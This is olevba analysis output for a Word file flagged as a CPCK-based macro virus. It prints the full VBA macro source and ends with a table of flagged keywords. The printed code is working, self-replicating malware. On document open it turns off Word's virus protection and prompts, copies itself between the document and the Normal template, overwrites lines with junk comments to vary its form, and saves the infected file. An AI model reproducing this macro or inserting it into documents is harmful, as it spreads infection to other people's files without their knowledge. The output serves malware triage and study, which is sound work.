olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-b78989acc92ce960163c3af9092ce5749919a1f5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-b78989acc92ce960163c3af9092ce5749919a1f5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'test.doctest.doc
On Error Resume Next
'test.doctest.doc
Options.SaveNormalPrompt = 0
'test.doctest.doc
Options.ConfirmConversions = 0
'test.doctest.doc
FA65 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'test.doctest.doc
Options.VirusProtection = 0
'test.doctest.doc
DT71 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'test.doctest.doc
Application.EnableCancelKey = 0
'test.doctest.doc
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'test.doctest.doc
Set IS41 = ActiveDocument.VBProject.VBComponents.Item(1)
'test.doctest.doc
SQ26 = True
'test.doctest.doc
End If
'test.doctest.doc
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'test.doctest.doc
Set IS41 = NormalTemplate.VBProject.VBComponents.Item(1)
'test.doctest.doc
TR25 = True
'test.doctest.doc
End If
'test.doctest.doc
If TR25 <> True And SQ26 <> True Then GoTo NE9
'test.doctest.doc
If TR25 = True Then IS41.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FA65 - 1))
'test.doctest.doc
If SQ26 = True Then IS41.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DT71 - 1))
'test.doctest.doc
With IS41.CodeModule
'test.doctest.doc
For x = 2 To (IS41.CodeModule.CountOfLines - 1) Step 2
'test.doctest.doc
.replaceline x, "'" & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter
'test.doctest.doc
Next x
'test.doctest.doc
End With
'test.doctest.doc
NE9:
'test.doctest.doc
If DT71 <> 0 And FA65 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'test.doctest.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

